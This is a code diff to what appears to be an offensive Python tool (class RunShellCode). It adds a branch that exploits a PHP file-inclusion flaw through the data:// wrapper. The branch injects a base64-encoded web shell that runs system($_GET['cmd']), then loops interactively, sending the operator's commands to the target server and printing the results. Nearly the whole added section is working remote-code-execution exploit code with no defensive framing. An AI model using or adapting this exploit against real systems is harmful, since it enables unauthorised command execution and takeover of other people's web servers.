@@ -205,11 +205,69 @@ class RunShellCode:
                     shutil.copyfile("./Package/shell/.response2.txt", "./Package/shell/.response.txt")
                 except Exception as a :
                     print(Y+"web_response : "+W , a)
-                    continue                          
+                    continue          
+        elif "php.ini" in self.url:
+            request = mechanize.Browser()
+            request.set_handle_robots(False)
+            request.set_handle_redirect(True)
+            request.set_handle_refresh(True, max_time=1)  
+            request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                            Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                            ('Cookie',str(self.Cookie).replace('\n',''))]
+            PHPWAPPER = "data://text/plain;base64,"                   
+            self.url =  self.Vulnurl + PHPWAPPER
+            with open("./Package/shell/.response.txt",'w') as response:
+                response = response.write(str(request.open(self.url).read()))
+            while True:
+                inputsuer = input(R+"Your_request   :  "+W)                                 
+                request = mechanize.Browser()
+                request.set_handle_robots(False)
+                request.set_handle_redirect(True)
+                request.set_handle_refresh(True, max_time=1)  
+                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                    ('Cookie',str(self.Cookie).replace('\n',''))]
+                PHPWAPPER = "data://text/plain;base64,"  
+                paylaodPHP= "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd="                 
+                command =  self.Vulnurl + PHPWAPPER +paylaodPHP + inputsuer   
+                with open("./Package/shell/.response2.txt",'w') as response2:
+                    response2 = response2.write(str(request.open(command ).read()))
+                with open("./Package/shell/.response.txt",'r') as f:
+                     file1_lines = f.read().split("\\n")
+                with open("./Package/shell/.response2.txt",'r') as Rqreder:
+                    file2_lines = Rqreder.read().split("\\n")  
+                DataList = []    
+                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.response2.txt', tofile='.response1.txt', lineterm='')
+                for line in diff:
+                    if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):
+                        cleaned_content = line[1:]   
+                        cleaned_content = re.sub(r'\s+\n', '\n', cleaned_content)  
+                        cleaned_content = re.sub(r'<p class="read-more">', '', cleaned_content)
+                        cleaned_content = re.sub(r'\+\s+', '', cleaned_content)  
+                        cleaned_content = re.sub( r'^.*\b\w+\d+:.*', '', cleaned_content)
+                        cleaned_content  = re.sub(r'\s+', ' ', cleaned_content)                     
+                        with open("./Package/shell/.data",'w') as data:
+                            data = data.write(cleaned_content)
+                        with open("./Package/shell/.data",'r') as data: 
+                           data = data.read().split("\n")
+                           for line in data:
+                                if line in DataList:
+                                  pass
+                                else:
+                                    DataList.append(line)
+                try:
+                    print(Y+"web_response   : "+W + DataList[0].replace('\n','').replace('(',''))
+                    for l in DataList[1:] :
+                          print("\t\t  "+l.replace('\n','').replace('(',''))           
+                    if os.path.exists ("./Package/shell/.data")  :
+                       os.remove("./Package/shell/.data")
+                    shutil.copyfile("./Package/shell/.response2.txt", "./Package/shell/.response.txt")
+                except Exception as a :
+                       print(Y+"web_response : "+W , a)
+                       continue                    
 if __name__=='__main__':
     try:
        RunShellCode()
     except Exception  as w :
        print(w)
        time.sleep(10)   
-
